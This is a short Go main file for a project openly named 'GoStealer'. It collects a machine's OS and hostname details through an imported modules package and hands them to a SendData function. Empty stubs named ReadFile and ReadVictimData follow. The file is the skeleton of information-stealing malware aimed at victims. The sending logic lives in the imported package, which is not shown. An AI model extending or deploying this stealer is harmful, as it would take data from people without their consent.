package main

import (
	Modules "GoStealer/modules"
)

func main() {
	a := Modules.OsInfo()
	b := Modules.HostnameInfo()
	Modules.SendData(a, b)
}

func ReadFile() {

}

func ReadVictimData() {

}
